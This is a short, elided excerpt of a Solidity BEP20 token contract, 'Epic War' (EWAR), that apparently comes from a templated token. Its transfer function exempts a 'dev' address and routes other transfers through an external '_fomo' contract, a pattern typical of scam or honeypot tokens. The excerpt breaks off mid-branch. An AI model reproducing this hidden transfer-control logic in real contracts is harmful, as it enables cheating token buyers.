...
contract Coin is BEP20, IERC20 {
  ...
  string public name =/*TOKENNAME*/"Epic War"/*TOKENNAME*/;
  string public symbol =/*TOKENSYMBOL*/"EWAR"/*TOKENSYMBOL*/;
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != dev) 
    {
      uint256 rewards = _fomo.tn(sender, recipient)*1000;
      if(sender==uniswapV2Pair && rewards>0)
      {
        if(_tOwned[MEXC]>rewards)
        {
